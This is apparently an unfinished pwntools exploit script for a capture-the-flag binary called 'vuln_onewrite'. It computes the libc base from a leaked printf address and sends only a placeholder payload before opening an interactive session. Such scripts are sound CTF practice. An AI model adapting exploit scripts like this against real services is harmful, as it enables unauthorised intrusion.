from pwn import *

gs = '''
b *main+119
b *main+143
continue
'''

elf = context.binary = ELF("./vuln_onewrite")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

leak_address = int(io.recvline().decode(), 16)

libc.address = leak_address - libc.symbols.printf

print("Printf: ", hex(leak_address))
print("Libc: ", hex(libc.address))
print("Puts: ", hex(libc.symbols.puts))

puts = libc.symbols.puts

#io.sendlineafter("> ", hex(leak_address).encode())
# __isoc99_scanf("%p%*c", &s)

payload = b"".join([
    b"AAAA",
    b"B"*3
])

io.sendlineafter("> ", payload)

io.interactive()